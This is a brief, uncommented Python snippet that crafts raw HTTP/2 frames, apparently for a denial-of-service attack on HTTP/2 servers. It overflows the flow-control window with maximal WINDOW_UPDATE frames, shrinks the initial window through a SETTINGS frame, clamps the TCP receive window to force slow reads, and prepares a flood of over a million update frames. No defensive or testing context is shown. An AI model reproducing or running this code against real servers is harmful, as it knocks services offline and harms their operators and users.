import socket
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
MAX = (1 << 31) - 1
def frame(kind, flags, stream, data=b""):
    return len(data).to_bytes(3, "big") + bytes((kind, flags)) + stream.to_bytes(4, "big") + data
def update(stream, value):
    return frame(8, 0, stream, value.to_bytes(4, "big"))
def setting(value):
    return frame(4, 0, 0, b"\0\4" + value.to_bytes(4, "big"))
def prepare(raw):
    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, 1024)
    event = (update(0, 1792) + update(0, MAX)
             + update(149, MAX - 1) + update(151, MAX - 1)
             + setting(2) + update(0, MAX))
    maximum = update(0, MAX)
    batch = maximum * (1048576)
    return event, batch
